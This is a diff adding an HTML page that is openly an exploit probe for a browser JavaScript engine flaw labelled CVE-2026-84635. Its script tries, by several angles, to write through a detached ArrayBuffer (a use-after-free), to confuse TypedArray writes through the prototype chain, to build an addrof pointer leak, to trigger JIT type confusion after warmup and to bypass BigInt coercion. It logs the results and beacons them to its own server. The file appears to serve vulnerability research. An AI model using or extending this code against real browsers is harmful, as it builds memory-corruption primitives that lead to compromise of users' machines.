@@ -1,0 +1,228 @@
+<!--
+  p662: CVE-2026-84635 — ALL exploitation angles
+  A: detach TOCTOU (structuredClone transfer inside valueOf)
+  B: prototype chain confusion (TypedArray as proto, ordinarySetWithOwnDescriptor)
+  C: DFG type tracking (warm Reflect.set, exploit wrong assumption)
+  D: addrof via prototype chain (write JSObject to Float64Array via proto walk)
+  CRASH_CLASS: HIGH
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p662</title></head>
+<body>p662: CVE-2026-84635 all angles
+<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
+<script>
+(function(){
+'use strict';
+var L=document.getElementById('log'),bQ=[];
+function emit(t,m){var s=t+(m!==undefined?' '+m:'');L.textContent+=s+'\n';bQ.push(s);if(bQ.length>=3)flush();}
+function flush(){if(!bQ.length)return;var b=bQ.splice(0,4).join('|');try{var x=new XMLHttpRequest();x.open('GET','/beacon/P662-'+encodeURIComponent(b),false);x.send();}catch(e){}}
+window.onerror=function(m){emit('ERR',String(m).slice(0,120));flush();};
+var f64=new Float64Array(1),u8=new Uint8Array(f64.buffer);
+function d2hex(d){f64[0]=d;var h='';for(var i=7;i>=0;i--)h+=('0'+u8[i].toString(16)).slice(-2);return h;}
+
+emit('START','v1');flush();
+
+// ================================================================
+// ANGLE A: detach TOCTOU via structuredClone transfer
+// Same as resize but with full detach — does putByIndex re-check?
+// ================================================================
+emit('A','detach-toctou');
+try{
+  var abA=new ArrayBuffer(1024);
+  var taA=new Float64Array(abA);
+  taA[0]=99.99;
+  var detached=false;
+  Reflect.set(taA,0,{valueOf:function(){
+    try{structuredClone(abA,{transfer:[abA]});detached=true;}catch(e){emit('A-XFER-ERR',e.message);}
+    return 3.14;
+  }},{});
+  emit('A-RESULT','detached='+detached+',abLen='+abA.byteLength+',ta0='+taA[0]);
+  // If ta0 is 3.14 and detached=true → write landed on detached buffer = UAF!
+  // If ta0 is undefined or 0 → write was blocked
+  if(detached && taA[0]===3.14) emit('A-VERDICT','UAF-WRITE-CONFIRMED');
+  else emit('A-VERDICT','blocked (ta0='+taA[0]+')');
+}catch(e){emit('A-ERR',e.name+':'+e.message);}
+flush();
+
+// ================================================================
+// ANGLE B: prototype chain confusion
+// TypedArray as prototype of regular object
+// ordinarySetWithOwnDescriptor missing TypedArray redirect
+// ================================================================
+emit('B','proto-chain-confusion');
+try{
+  // B1: basic — TypedArray in proto, set indexed property
+  var taB=new Float64Array(10);
+  taB[0]=111.111;
+  var objB=Object.create(taB);
+  
+  // Set obj[0] — should create own property on objB
+  // Without fix: might write to taB[0] instead
+  objB[0]=222.222;
+  emit('B1-RESULT','objB[0]='+objB[0]+',taB[0]='+taB[0]+',hasOwn='+objB.hasOwnProperty(0));
+  if(taB[0]===222.222) emit('B1-VERDICT','PROTO-WRITE — wrote to TypedArray!');
+  else emit('B1-VERDICT','normal (own prop on objB)');
+
+  // B2: Reflect.set with TypedArray proto, receiver = the child object
+  var taB2=new Float64Array(10);
+  taB2[5]=555.555;
+  var objB2=Object.create(taB2);
+  Reflect.set(objB2,5,666.666,objB2);
+  emit('B2-RESULT','objB2[5]='+objB2[5]+',taB2[5]='+taB2[5]);
+
+  // B3: set OOB index on child — TypedArray has 10 elements, set index 100
+  var taB3=new Float64Array(10);
+  var objB3=Object.create(taB3);
+  objB3[100]=777.777;
+  emit('B3-OOB','objB3[100]='+objB3[100]+',hasOwn='+objB3.hasOwnProperty(100));
+  // Without fix: write creates own property (normal)
+  // With fix: write silently dropped for OOB
+
+  // B4: Reflect.set targeting the TypedArray, receiver = child
+  var taB4=new Float64Array(10);
+  taB4[0]=0;
+  var objB4=Object.create(taB4);
+  Reflect.set(taB4,0,888.888,objB4);
+  emit('B4-RESULT','taB4[0]='+taB4[0]+',objB4[0]='+objB4[0]);
+  // Vulnerable: taB4[0]=888.888 (write goes to TA ignoring receiver)
+  // Patched: objB4[0]=888.888 (write goes to receiver)
+  if(taB4[0]===888.888) emit('B4-VERDICT','VULNERABLE-ta-written');
+  else emit('B4-VERDICT','patched-receiver-written');
+}catch(e){emit('B-ERR',e.name+':'+e.message);}
+flush();
+
+// ================================================================
+// ANGLE C: addrof attempt — write JS object to Float64Array
+// If the prototype chain path writes a JSValue directly without
+// coercion, reading back gives NaN-boxed pointer bits
+// ================================================================
+emit('C','addrof-attempt');
+try{
+  var target={x:1,y:2,z:3}; // object whose address we want
+  
+  // C1: direct Reflect.set with object value
+  var taC=new Float64Array(10);
+  Reflect.set(taC,0,target,{});
+  var raw=taC[0];
+  emit('C1-DIRECT','val='+raw+',hex='+d2hex(raw)+',isNaN='+isNaN(raw));
+  // If raw is NaN with non-standard bits → might be a pointer!
+  
+  // C2: via prototype chain
+  var taC2=new Float64Array(10);
+  var objC2=Object.create(taC2);
+  objC2[0]=target;
+  emit('C2-PROTO','taC2[0]='+taC2[0]+',hex='+d2hex(taC2[0])+',objC2[0]='+(typeof objC2[0]));
+  // If taC2[0] is NaN with pointer bits → addrof!
+  
+  // C3: via Reflect.set on child with TA proto
+  var taC3=new Float64Array(10);
+  var objC3=Object.create(taC3);
+  Reflect.set(objC3,0,target,objC3);
+  emit('C3-REFLECT','taC3[0]='+taC3[0]+',hex='+d2hex(taC3[0]));
+
+  // C4: multiple types to check coercion behavior
+  var taC4=new Float64Array(4);
+  var vals=[target, [1,2,3], "hello", Symbol('s')];
+  var labels=['obj','arr','str','sym'];
+  for(var i=0;i<4;i++){
+    try{
+      Reflect.set(taC4,i,vals[i],{});
+      emit('C4-'+labels[i],'val='+taC4[i]+',hex='+d2hex(taC4[i]));
+    }catch(e){
+      emit('C4-'+labels[i],'threw:'+e.name);
+    }
+  }
+}catch(e){emit('C-ERR',e.name+':'+e.message);}
+flush();
+
+// ================================================================
+// ANGLE D: DFG behavior — warm Reflect.set then switch types
+// If DFG tracks that the write goes to TA (buggy), it might
+// make wrong type assumptions downstream
+// ================================================================
+emit('D','dfg-confusion');
+try{
+  var taD=new Float64Array(10);
+  
+  function hotSet(ta, idx, val, recv) {
+    Reflect.set(ta, idx, val, recv);
+    return recv[idx]; // DFG might think this is val (if it assumes write went to recv)
+  }
+  
+  // Warm with doubles → DFG compiles
+  var recv={};
+  for(var i=0;i<5000;i++){
+    recv={};
+    hotSet(taD, 0, i*1.1, recv);
+  }
+  
+  // Check: does recv[0] get the value, or does taD[0]?
+  var finalRecv={};
+  hotSet(taD, 0, 42.42, finalRecv);
+  emit('D-HOT','taD[0]='+taD[0]+',finalRecv[0]='+finalRecv[0]);
+  
+  // Try with an object value after warmup
+  var targetD={addr:0xDEAD};
+  var recvD={};
+  hotSet(taD, 0, targetD, recvD);
+  emit('D-OBJ','taD[0]='+taD[0]+',hex='+d2hex(taD[0])+',recvD[0]='+(typeof recvD[0]));
+  // If taD[0] has NaN-boxed pointer bits after DFG compilation → DFG type confusion!
+  
+  // Check for non-standard NaN (pointer residue)
+  var bits=d2hex(taD[0]);
+  if(bits!=='7ff8000000000000' && bits!=='fff8000000000000' && isNaN(taD[0])){
+    emit('D-VERDICT','NON-STANDARD-NAN — possible pointer leak: 0x'+bits);
+  } else {
+    emit('D-VERDICT','standard-NaN-or-number: '+taD[0]);
+  }
+}catch(e){emit('D-ERR',e.name+':'+e.message);}
+flush();
+
+// ================================================================
+// ANGLE E: BigInt64Array type confusion
+// BigInt64Array expects BigInt values. Without coercion guard,
+// a regular number might be written as raw bits
+// ================================================================
+emit('E','bigint-confusion');
+try{
+  if(typeof BigInt64Array !== 'undefined'){
+    var taE=new BigInt64Array(4);
+    var recvE={};
+    // Normally: Reflect.set(ta, 0, 42n, recv) → ta[0]=42n (BigInt required)
+    // Vulnerable: Reflect.set goes to ta.putByIndex → toNativeFromValue
+    //   expects BigInt → passing a Number should throw TypeError
+    //   BUT if the bug bypasses coercion...
+    
+    try{
+      Reflect.set(taE,0,42,recvE); // 42 is NOT BigInt
+      emit('E-NUM','ta[0]='+taE[0]+',threw=false');
+    }catch(e){
+      emit('E-NUM','threw='+e.name+':'+e.message);
+    }
+    
+    // Try with object valueOf returning non-BigInt
+    try{
+      Reflect.set(taE,1,{valueOf:function(){return 0xDEADBEEF;}},recvE);
+      emit('E-OBJ','ta[1]='+taE[1]+',threw=false');
+    }catch(e){
+      emit('E-OBJ','threw='+e.name);
+    }
+    
+    // Try with object valueOf returning BigInt
+    try{
+      Reflect.set(taE,2,{valueOf:function(){return 123n;}},recvE);
+      emit('E-BIG','ta[2]='+taE[2]+',threw=false');
+    }catch(e){
+      emit('E-BIG','threw='+e.name);
+    }
+  } else {
+    emit('E-SKIP','BigInt64Array not available');
+  }
+}catch(e){emit('E-ERR',e.name+':'+e.message);}
+flush();
+
+emit('DONE','p662-complete');
+flush();
+})();
+</script>
+</body>
+</html>
